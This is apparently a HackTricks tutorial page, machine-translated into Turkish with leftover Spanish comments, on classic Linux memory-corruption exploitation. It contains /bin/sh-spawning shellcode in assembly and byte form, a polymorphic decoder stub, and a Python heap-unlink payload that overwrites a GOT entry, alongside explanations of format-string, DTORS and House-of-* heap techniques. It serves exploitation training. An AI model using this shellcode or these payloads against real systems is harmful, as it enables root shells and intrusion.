# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na bakın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**]'ni alın (https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**]'den oluşan koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **2.SHELLCODE**

Kernel kesmelerini görüntüle: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'ı temizle\
xor ebx, ebx ; ebx = 0 çünkü geçirilecek bir argüman yok\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Sistem çağrısını yürüt

**nasm -f elf assembly.asm** —> Bir .o dosyası döndürür\
**ld assembly.o -o shellcodeout** —> Derlenmiş kod içeren yürütülebilir bir dosya verir ve **objdump** ile opcode'ları çıkarabiliriz\
**objdump -d -Mintel ./shellcodeout** —> Gerçekten shellcodemuz olduğunu ve opcode'ları çıkarmak için

**Shellcodenin çalıştığını kontrol etmek**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Sistem çağrılarının doğru yapıldığını görmek için önceki program derlenmeli ve sistem çağrıları **strace ./DERLENMİŞ_PROGRAM** içinde görünmelidir.

Shellcode'lar oluşturulurken bir hile yapılabilir. İlk talimat bir çağrıya bir sıçrama yapmaktır. Çağrı, orijinal kodu çağırır ve aynı zamanda EIP'yi yığına yerleştirir. Çağrı talimatından sonra ihtiyacımız olan dizeyi eklemişizdir, bu nedenle bu EIP ile dizeyi işaretleyebilir ve aynı zamanda kodu devam ettirebiliriz.

ÖRNEK **HİLE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Yumurta Avcısı:**

Bir işleme ilişkilendirilmiş bellek sayfalarını dolaşarak orada saklanan shellcode'u arayan küçük bir kod parçasıdır (shellcode'da yer alan bir imza arar). Kod enjekte etmek için sadece küçük bir alanın olduğu durumlarda faydalıdır.

**Polimorfik Shellcode'lar**

Küçük kodlarla şifrelenmiş kabuklardır ve bunları çözen ve onlara atlayan küçük kodlar içerirler, Call-Pop hilesini kullanarak şifrelenmiş bir örnek şöyle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5. Ek yöntemler**

**Ret2Ret**

EIP'ye bir adres yerleştirilemediğinde (EIP'nin 0xbf içermediği kontrol edilir) veya shellcode'un konumu hesaplanamadığında faydalıdır. Ancak, zafiyetli fonksiyon bir parametre kabul eder (shellcode buraya gidecektir).

Bu şekilde, EIP'yi bir **ret** adresine değiştirerek, bir sonraki adres yüklenecektir (bu, fonksiyonun ilk argümanının adresidir). Yani, shellcode yüklenecektir.

Saldırı: SHELLCODE + Dolgu (EIP'ye kadar) + **\&ret** (yığının sonraki baytları, geçirilen parametre adresine işaret ettiği için shellcode'un başlangıcına işaret eder)

**strncpy** gibi işlevler, tamamlandığında shellcode'un saklandığı adresi yığından kaldırır, bu da bu tekniği imkansız kılar gibi görünmektedir. Yani, işlev için argüman olarak geçirilen adres (shellcode'u saklayan adres) 0x00 ile değiştirilir, bu nedenle ikinci **ret** çağrıldığında 0x00 ile karşılaşılır ve program çöker.

**Murat Tekniği**

Linux'ta tüm programlar 0xbfffffff'den başlayarak eşlenir.

Linux'ta yeni bir işlem yığını nasıl oluşturulduğunu göz önünde bulundurarak, bir programın yalnızca shellcode'un bulunduğu bir ortamda başlatılmasını sağlayacak bir saldırı geliştirilebilir. Bu durumda, bu değişkenin adresi şu şekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(FULL_EXECUTABLE_NAME) - strlen(shellcode)

Bu şekilde, shellcode'un bulunduğu ortam değişkeninin adresi kolayca elde edilir.

Bu, execle fonksiyonunun istenilen sadece çevresel değişkenlere sahip bir ortam oluşturmasına izin vermesi sayesinde yapılabilir.

**Tamsayı taşmaları**

Bu tür taşmalar, bir değişkenin geçirilen kadar büyük bir sayıyı desteklemeye hazır olmadığında meydana gelir, muhtemelen işaretli ve işaretsiz değişkenler arasındaki karışıklıktan kaynaklanabilir, örneğin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Önceki örnekte programın 2 parametre beklediğini görüyoruz. İlk parametre takip eden dizenin uzunluğu ve ikinci parametre dizedir.

Eğer ilk parametre olarak negatif bir sayı verirsek len < 256 çıkacaktır ve bu filtreyi geçeceğiz, ayrıca strlen(buffer) da l'den daha küçük olacaktır, çünkü l unsigned int'tir ve çok büyük olacaktır.

Bu tür taşmalarda amaç, programın işlemine bir şeyler yazmak değil, kötü tasarlanmış filtreleri aşarak diğer zafiyetleri sömürmektir.

**Başlatılmamış Değişkenler**

Başlatılmamış bir değişkenin alabileceği değer bilinmez ve bunu gözlemlemek ilginç olabilir. Önceki işlevdeki bir değişkenin aldığı değeri alabilir ve bu değişken saldırgan tarafından kontrol edilebilir.

##

###

###

###

### **.fini\_array**

Temelde, bu programın bitmeden önce çağrılacak işlevlerin bulunduğu bir yapıdır. Bu, **shellcode'unuza bir adrese atlayarak çağırabiliyorsanız** veya format dizesini ikinci kez sömürmek için tekrar main'e **dönmek zorunda kaldığınız durumlarda** ilginçtir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Bu, **sonsuz bir döngü oluşturmayacak** çünkü ana programa geri döndüğünüzde canary fark edecek, yığının sonu bozulabilir ve işlev tekrar çağrılmayacak. Bu sayede **zafiyetin 1 kez daha yürütülmesini** sağlayabileceksiniz.

### **İçeriği Dökmek İçin Format Dizileri**

Bir format dizesi, programın belleğinden içerik **dökmek** için de kötüye kullanılabilir.\
Örneğin, aşağıdaki durumda, yığında bir bayrağa işaret eden bir **yerel değişken** var. Eğer **bellekte bayrağa işaret eden işaretçinin nerede olduğunu bulursanız**, **printf'in** o **adrese erişmesini** sağlayabilir ve **bayrağı yazdırabilirsiniz**:

Yani, bayrak **0xffffcf4c** adresinde

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sızıntıdan **bayrağa işaret eden işaretçinin** **8.** parametrede olduğunu görebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye erişerek** bayrağı alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

**Önceki zafiyeti** takip ederek ve **içerik sızdırabileceğinizi** fark ederek, **`printf`**'e **işaretçileri ayarlayabilir** ve **yürütülebilir** olan bölüme **erişebilir** ve onu **tamamen dökülebilirsiniz**!

### **DTOR**

{% hint style="danger" %}
Günümüzde bir dtor bölümü olan bir ikili dosya bulmak çok **garip**.
{% endhint %}

Yıkıcılar, programın **sonlandığından önce yürütülen işlevlerdir**.\
Bir **adresi** **`__DTOR_END__`**'e yazmayı başarırsanız, bu, programın sona ermeden önce **yürütülecektir**.\
Bu bölümün adresini şu şekilde alın:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Genellikle **DTOR** bölümünü `ffffffff` ve `00000000` değerleri **arasında** bulacaksınız. Bu yüzden sadece bu değerleri görüyorsanız, bu, **herhangi bir işlevin kayıtlı olmadığı anlamına gelir**. Bu yüzden **`00000000`**'ı **üzerine yazarak** shellcode'ı **çalıştırmak için adresi** yazın.

### **Format Dizileri ile Tampon Taşmaları**

**sprintf**, biçimlendirilmiş bir dizesi **bir değişkene taşır**. Bu nedenle, bir dizenin biçimlendirmesini **kullanarak**, içeriğin kopyalandığı değişkende bir **tampon taşmasına neden olabilirsiniz**.\
Örneğin, yük `%.44xAAAA` değişkene **44B+"AAAA" yazacaktır**, bu da bir tampon taşmasına neden olabilir.

### **\_\_atexit Yapıları**

{% hint style="danger" %}
Günümüzde bunu **saldırmak çok garip**.
{% endhint %}

**`atexit()`**, **parametre olarak başka işlevlerin** geçirildiği bir işlevdir. Bu **işlevler**, bir **`exit()`** veya **main**'in **dönüşü** sırasında **çalıştırılacaktır**.\
Örneğin, bu işlevlerden herhangi birinin adresini örneğin bir shellcode'a yönlendirebilirseniz, **işlemi kontrol edebilirsiniz**, ancak bu şu anda daha karmaşıktır.\
Şu anda **çalıştırılacak işlevlerin adresleri** birkaç yapı arkasında gizlenmiştir ve sonunda işlevlerin adresleri değil, **XOR ile şifrelenmiş ve rastgele bir anahtarla kaydırılmıştır**. Bu nedenle, bu saldırı vektörü şu anda **en azından x86** ve **x64\_86** üzerinde çok kullanışlı değildir.\
**Şifreleme işlevi** **`PTR_MANGLE`**'dır. m68k, mips32, mips64, aarch64, arm, hppa gibi **diğer mimariler**, girdi olarak aldığı gibi **şifreleme işlevini uygulamaz**. Bu nedenle, bu mimariler bu vektör tarafından saldırıya uğrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Günümüzde bunu **saldırmak çok garip**.
{% endhint %}

**`Setjmp()`**, **bağlamı** (kayıtları) **kaydetmeye izin verir**\
**`longjmp()`**, **bağlamı geri yüklemeye izin verir**.\
**Kaydedilen kayıtlar**: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan şudur ki EIP ve ESP **`PTR_MANGLE`** işlevi tarafından geçirilir, bu nedenle **bu saldırıya duyarlı mimariler yukarıdakiyle aynıdır**.\
Hata kurtarma veya kesmeler için kullanışlıdır.\
Ancak okuduğum kadarıyla, diğer kayıtların korunmadığı, bu nedenle bir işlevin içinde `call ebx`, `call esi` veya `call edi` varsa kontrol alınabilir. Veya EBP değiştirilerek ESP değiştirilebilir.

**VTable ve VPTR in C++**

Her sınıfın bir **Vtable**'ı vardır, bu bir **yöntemler dizisidir**.

Her bir **sınıfın nesnesi**, sınıfının bir **dizisine işaret eden** bir **VPtr**'ye sahiptir. VPtr, her nesnenin başlığının bir parçasıdır, bu nedenle **VPtr'nin üzerine yazılması başarılı olursa**, bir işlevi çalıştırmak için sahte bir yönteme işaret edebilir.

## **Önleyici ve Kaçınma Önlemleri**

###

**Libsafe Değiştirme**

Şununla etkinleştirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
“/lib/libsave.so.2” > /etc/ld.so.preload

Bazı güvensiz işlev çağrılarını güvenli işlevlerle değiştirir. Standart değildir. (yalnızca x86 için, -fomit-frame-pointer ile derlenmemiş, statik derlemeler için geçerli değil, tüm savunmasız işlevler güvenli hale gelmez ve LD\_PRELOAD, setuid ile çalışan ikili dosyalarda çalışmaz).

**ASCII Zırhlı Adres Alanı**

Paylaşılan kütüphaneleri 0x00000000 ile 0x00ffffff arasında yüklemek, her zaman bir 0x00 baytının olmasını sağlar. Bununla birlikte, bu neredeyse hiçbir saldırıyı durdurmaz, özellikle little endian'da.

**ret2plt**

strcpy@plt işlevini (plt'den) çağırmak ve GOT girdisinin başına işlemek ve çağrılmak istenen işlevin (system()) ilk baytını kopyalamak için bir ROP gerçekleştirmek anlamına gelir. Ardından aynısını GOT+1'e işaret ederek system()'ın 2. baytını kopyalarsınız... Sonunda GOT'da saklanan adres çağrılır ve bu system() olacaktır.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user —> Belirli bir alt dizin altına temel bir sistem yükler

Bir yönetici, bu kafeslerden birinden çıkmak için şunu yapabilir: mkdir foo; chroot foo; cd ..

**Kod Enstrümantasyonu**

Valgrind —> Hataları arar\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Önceki parçanın boş olduğunu gösteren bitin 1 olduğu önemlidir**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, 3. parçanın "size" alanının 4 byte geride olduğunu düşünmesi için (prev\_size'ye işaret eder)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da başta 8 byte dolgu olacak şekilde**

**got\_free = pack("\<I", 0x08048300 - 12) #free() fonksiyonunun adresi plt-12 (free ikinci kez çağrıldığında shellcode'un çalıştırılacağı adresi üzerine yazacak)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload, 8 byte dolgu ile başlar**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parça değiştirilir, got\_free, addr\_sc adresini saklayacağı yere işaret eder + 12**

**os.system("./8.3.o " + payload)**

**unset() ters sırayla serbest bırakma (wargame)**

Üç ardışık parçayı kontrol ediyoruz ve sırasıyla serbest bırakılıyorlar.

Bu durumda:

C parçasına shellcode yerleştirilir

A parçasını, A parçasının boş olduğunu düşünmesi için size alanındaki PREV\_INUSE bitini devre dışı bırakacak şekilde B'yi üzerine yazmak için kullanırız.

Ayrıca, başlık B'deki size alanını -4 olarak ayarlarız.

Bu durumda, program "a"nın boş olduğunu ve bir binde olduğunu düşünecek ve onu çözmek için unlink() fonksiyonunu çağıracaktır. Ancak, çünkü başlık PREV\_SIZE -4 olarak ayarlanmıştır, program "a" parçasının aslında B+4'te başladığını düşünecektir. Yani, B+4'te "fd" işaretçisi ve B+16'da "bk" işaretçisi olacaktır.

Bu şekilde, bk'ye shellcode'un adresini ve fd'ye "puts()" fonksiyonunun adresini -12 olarak yerleştirirsek, payloadumuzu elde ederiz.

**Frontlink Tekniği**

Bir şey serbest bırakıldığında ve yanındaki parçalar boş değilse, unlink() fonksiyonu çağrılmaz, doğrudan frontlink() fonksiyonu çağrılır.

Saldırı yapılan malloc hiçbir zaman serbest bırakılmazsa yararlı bir zayıflıktır.

Gereksinimler:

Veri girişi işleviyle taşma olabilecek bir tampon

Bu tampona bitişik serbest bırakılacak ve başlık alanının fd alanı taşma nedeniyle değiştirilecek bir tampon

512'den büyük ancak önceki tampona göre küçük bir boyutta serbest bırakılacak bir tampon

Bu adımdan önce bu tamponun prev\_size alanını üzerine yazabileceğiniz bir tampon

Bu şekilde, kontrolsüz iki malloc üzerine yazarak ve sadece biri serbest bırakıldığında bir saldırı gerçekleştirebiliriz.

**Çift serbest bırakma Zafiyeti**

Aynı işaretçiyle iki kez free() çağrılırsa, iki adresi işaret eden iki bin oluşur.

Birini tekrar kullanmak istendiğinde sorunsuzca atanır. Diğerini kullanmak istendiğinde, önceki rezervasyonun yazacağı verilerle "fd" ve "bk" işaretçileri yanıltılır.

**Free() Sonrası**

Önceden serbest bırakılan bir işaretçi kontrolsüz bir şekilde tekrar kullanılır.

## **8 Heap Taşmaları: Gelişmiş Saldırılar**

Unlink() ve FrontLink() teknikleri unlink() fonksiyonu değiştirilerek kaldırıldı.

**The house of mind**

Kodun keyfi olarak yürütülmesi için sadece bir free() çağrısı gereklidir. Taşan bir önceki tampon tarafından serbest bırakılacak ve üzerine yazılacak ikinci bir tampon aranır.

Bir free() çağrısı, public\_fREe(mem) fonksiyonunu çağırır, bu işlemi yapar:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Bir parçanın başladığı adresi (mem-8) döndürür

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1] kısmında NON\_MAIN\_ARENA bitini kontrol eder, bu biti true döndürmek için değiştirilebilir ve heap\_for\_ptr() fonksiyonunu çalıştırır, bu da "mem" üzerinde bir and işlemi yaparak en az anlamlı 2.5 byte'ı sıfırlar (örneğin 0x0804a000 adresinde 0x08000000 yapar) ve 0x08000000->ar\_ptr adresine erişir (struct heap\_info gibi).

Bu şekilde, örneğin 0x0804a000 adresinde bir parçayı kontrol edebilir ve **0x081002a0** adresinde bir parçanın serbest bırakılacağını varsayarsak, 0x08100000 adresine ulaşabilir ve istediğimiz şeyi yazabiliriz, örneğin **0x0804a000**. Bu ikinci parça serbest bırakıldığında, heap\_for\_ptr(ptr)->ar\_ptr'yi 0x08100000 adresinde yazdığımızı görecektir (çünkü önce 0x081002a0 adresine and uygulanır ve buradan ilk 4 byte'ın değeri alınır, yani ar\_ptr).

Böylece, \_int\_free(ar\_ptr, mem) çağrılır, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Önceki bölümde av değerini kontrol edebildiğimiz için, serbest bırakılacak parçanın üzerine yazdığımız değeri kontrol edebiliriz.

unsorted\_chunks fonksiyonunun tanımına göre biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle, av->bins\[2] adresine \_\_DTOR\_END\_\_-12 adresini yazarsak, son komutta \_\_DTOR\_END\_\_ adresine ikinci parçanın adresi yazılacaktır.

Yani, ilk parçaya \_\_DTOR\_END\_\_-12 adresini başa çok kez yazmalıyız çünkü av->bins\[2] buradan alacaktır.

İkinci parçada ve ilk parçanın yardımıyla prev\_size'a bir jump 0x0c ve size'a -> NON\_MAIN\_ARENA'yı etkinleştirecek bir değer yazmalıyız.

Ardından, ikinci parçaya çok sayıda nops ve sonunda shellcode'u ekleriz.

Bu şekilde, \_int\_free(TROZO1, TROZO2) çağrılır ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazılır, bu da shellcode'a atlar.
Bu tekniği uygulamak için payload'u biraz daha karmaşık hale getiren bazı gereksinimlerin karşılanması gerekmektedir.

Bu teknik artık uygulanabilir değil çünkü unlink için neredeyse aynı yama uygulandı. Yeni hedef siteye işaret edilip edilmediği kontrol edilir.

**Fastbin**

The house of mind'in bir varyantıdır.

\_int\_free() fonksiyonunun ilk kontrolünden sonra aşağıdaki kodu çalıştırmak istiyoruz.

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Bu şekilde, "fb" adresi GOT'taki bir fonksiyonun adresini verirse, bu adrese üzerine yazılacak olan parçanın adresi konulacaktır. Bunun için, arena'nın dtors adreslerine yakın olması gerekecektir. Daha doğrusu, av->max\_fast'in üzerine yazılacak adres olması gerekmektedir.

The House of Mind ile kontrolün av'nin konumunu bizim kontrol ettiğimizi gördüğümüz için.

Bu durumda, boyut alanına 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu koyarsak —> fastbin\_index() bize fastbins\[-1] döndürecektir, bu da av->max\_fast'e işaret edecektir.

Bu durumda av->max\_fast'in üzerine yazılacak adres olacaktır (işaret ettiği değil, üzerine yazılacak olan pozisyon).

Ayrıca, serbest bırakılan parçanın bitişik parçasının 8'den büyük olması gerekmektedir -> Serbest bırakılan parçanın boyutunun 8 olduğunu söylediğimize göre, bu sahte parçaya sadece 8'den büyük bir boyut koymamız yeterli olacaktır (ayrıca shellcode'un serbest bırakılan parçada olacağını düşündüğümüzden, başlangıçta bir jmp koymamız gerekecektir).

Ayrıca, aynı sahte parçanın av->system\_mem'den küçük olması gerekmektedir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayıda adres nedeniyle, bu bölümlerin hiçbiri üzerine yazılacak adres olarak uygun değildir, bu yüzden pili hedeflemek için fastbin'i nasıl uygulayacağımıza bakalım.

Başka bir saldırı şekli de **av**'yi pile yönlendirmektir.

Boyutu 8 yerine 16 yapacak şekilde değiştirirsek: fastbin\_index() bize fastbins\[0] döndürecektir ve bunu pile yazmak için kullanabiliriz.

Bunun için pile canary veya garip değerler olmamalıdır, aslında şu şekilde olmalıdır: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese işaret edeceği ve bir **av**'nin ilk öğesinin 0 olması gereken mutex içindir.

**av->max\_fast** EBP olacak ve bizi kısıtlamalardan kaçınmamıza yardımcı olacak bir değer olacaktır.

**av->fastbins\[0]** adresi **p**'nin adresiyle üzerine yazılacak ve RET olacaktır, böylece shellcode'a atlanacaktır.

Ayrıca, **av->system\_mem** (pile göre 1484 bayt yukarıda) bize izin veren oldukça fazla çöp olacaktır.

Ayrıca, serbest bırakılan parçanın bitişik parçasının 8'den büyük olması gerekmektedir -> Serbest bırakılan parçanın boyutunun 16 olduğunu söylediğimize göre, bu sahte parçaya sadece 8'den büyük bir boyut koymamız yeterli olacaktır (ayrıca shellcode'un serbest bırakılan parçada olacağını düşündüğümüzden, yeni sahte parçanın boyut alanının hemen sonrasına düşen nops'a atlayan bir jmp koymamız gerekecektir).

**The House of Spirit**

Bu durumda, saldırgan tarafından değiştirilebilecek bir malloc işaretçisine sahip olmayı amaçlıyoruz (örneğin, işaretçinin bir değişken üzerine taşma olasılığı olan yığının altında olması).

Böylece, bu işaretçiyi istediği yere işaret edecek şekilde yapabiliriz. Ancak, herhangi bir yer uygun değildir, sahte parçanın boyutu av->max\_fast'ten küçük olmalı ve daha spesifik olarak gelecekteki bir malloc() çağrısında istenen boyuta 8 eklenmelidir. Bu nedenle, eğer bu savunmasız işaretçiden sonra 40'lık bir malloc çağrıldığını biliyorsak, sahte parçanın boyutu 48 olmalıdır.

Örneğin, program kullanıcıdan bir sayı istediğinde 48 girebilir ve değiştirilebilir malloc işaretçisini 4 bayt sonraki değerlere (şans eseri EBP'ye ait olabilir, böylece 48 arkada kalır gibi) yönlendirebiliriz. Ayrıca, ptr-4+48 adresinin çeşitli koşulları karşılaması gerekmektedir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem olmalıdır.

Bu koşullar sağlandığında, söz konusu malloc(40) çağrıldığında EBP'nin adresi olarak atanacaktır. Saldırgan ayrıca bu malloc'ta ne yazılacağını kontrol edebiliyorsa, EBP ve EIP'yi istediği adrese üzerine yazabilir.

Bu, çünkü free() işlemi, yığının EBP'sine işaret eden bir parçanın yeni malloc() için mükemmel boyutta bir parça olduğunu hatırlayacak ve bu nedenle o adrese atayacaktır.

**The House of Force**

Gereksinimler:

* Wilderness'ı üzerine yazılabilir hale getiren bir taşma
* Kullanıcı tarafından tanımlanan boyutta bir malloc() çağrısı
* Kullanıcı tarafından tanımlanan verilere sahip bir malloc() çağrısı

İlk olarak, wilderness parçasının boyutunu çok büyük bir değerle (0xffffffff) üzerine yazmak, yeterince büyük bir bellek talebinin heap'i genişletmeden \_int\_malloc() tarafından işlenmesini sağlar.

İkincisi, av->top'u, saldırganın kontrolü altındaki bir bellek bölgesine, örneğin yığın, işaret edecek şekilde değiştirmektir. av->top'a \&EIP - 8 konulacaktır.

Saldırganın kontrolü altındaki bellek bölgesine işaret eden av->top'u değiştirmemiz gerekmektedir:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parçasının adresini (mevcut av->top) alır ve remainder tam olarak bu adresin malloc() tarafından talep edilen bayt sayısı kadar ilerisine denk gelir. Bu nedenle, \&EIP-8'in 0xbffff224 olduğu ve av->top'un 0x080c2788 olduğu durumda, av->top'un bir sonraki malloc() için \&EIP-8'e işaret etmesi gereken malloc'ta rezerve edilmesi gereken bayt miktarı şöyle olacaktır:

0xbffff224 - 0x080c2788 = 3086207644.

Bu şekilde değiştirilmiş değer av->top'a kaydedilecek ve bir sonraki malloc EIP'ye işaret edecek ve üzerine yazabilecektir.

Yeni wilderness parçasının boyutunun, son malloc() tarafından yapılan talepten daha büyük olması önemlidir. Yani, wilderness \&EIP-8'e işaret ediyorsa, boyut tam olarak yığının EBP alanında kalacaktır.

**The House of Lore**

**SmallBin Bozulması**

Serbest bırakılan parçalar, boyutlarına göre binlere yerleştirilir. Ancak, bunlar binlere yerleştirilmeden önce sıralanmamış binlerde saklanır. Bir parça serbest bırakıldığında, hemen kendi uygun binine konulmaz, sıralanmamış binlerde kalır. Sonra, yeni bir parça rezerve edilirse ve önceki serbest bırakılan parça yeterliyse, bu parça geri verilir, ancak daha büyük bir parça rezerve edilirse, sıralanmamış binlerdeki serbest bırakılan parça uygun binine konulur.

Zararlı kodun ulaşılabilir olması için bellek talebi av->max\_fast'tan büyük (genellikle 72) ve MIN\_LARGE\_SIZE'dan küçük (512) olmalıdır.

Eğer uygun boyutta bir parça varsa, bu parça geri verilir ve ardından şunlar yapılır:

bck = victim->bk; Önceki parçaya işaret eder, değiştirebileceğimiz tek bilgidir.

bin->bk = bck; Bir önceki parça son parça olur, bck yığını işaret ediyorsa, bir sonraki rezerve edilen parçaya bu adres verilecektir.

bck->fd = bin; Liste kapatılır ve bu bin'i işaret eder.

Gereksinimler:
İki malloc ayrılmalı, böylece ilkine ikincisi serbest bırakıldıktan sonra taşma yapılabilir (yani taşma yapmadan önce ikinci parçanın bir malloc'tan daha büyük bir parça olması gerekmektedir).

Saldırganın kontrol edebileceği saldırgan tarafından seçilen bir adresi olan ayrılan malloc.

Amacımız şudur, bir heap'e taşma yapabilirsek ve altında serbest bırakılmış ve bin'ine (yani taşmadan önce ikinci parçanın bir malloc'tan daha büyük bir parça olması gerekmektedir) yerleştirilmiş bir parça varsa, bk işaretçisini değiştirebiliriz. Bk işaretçisini değiştirirsek ve bu parça bin'in listenin ilk parçası haline gelirse ve ayrıldığında, bin yanıltılacak ve bir sonraki parçanın (sunulan) yanlış adreste olduğuna inanılacak (örneğin stack veya GOT'a). Bu durumda başka bir parça yeniden ayrıldığında ve saldırganın izinleri varsa, istenen konumda bir parça verilecek ve oraya yazabilecektir.

Değiştirilen parçanın serbest bırakılmasından sonra serbest bırakılan parçadan daha büyük bir parça ayrılması gerekmektedir, böylece değiştirilen parça sıralanmamış binlerden çıkar ve bin'ine yerleştirilir.

Bin'e yerleştirildikten sonra, taşma yoluyla bk işaretçisini değiştirmek için zamanı gelir, böylece bin, malloc() yeterince çağrıldığında değiştirilmiş bin'i tekrar kullanır ve bin'i yanıltarak bir sonraki parçanın yanlış adreste olduğuna inanır. Ve ardından istenen parça verilecektir.

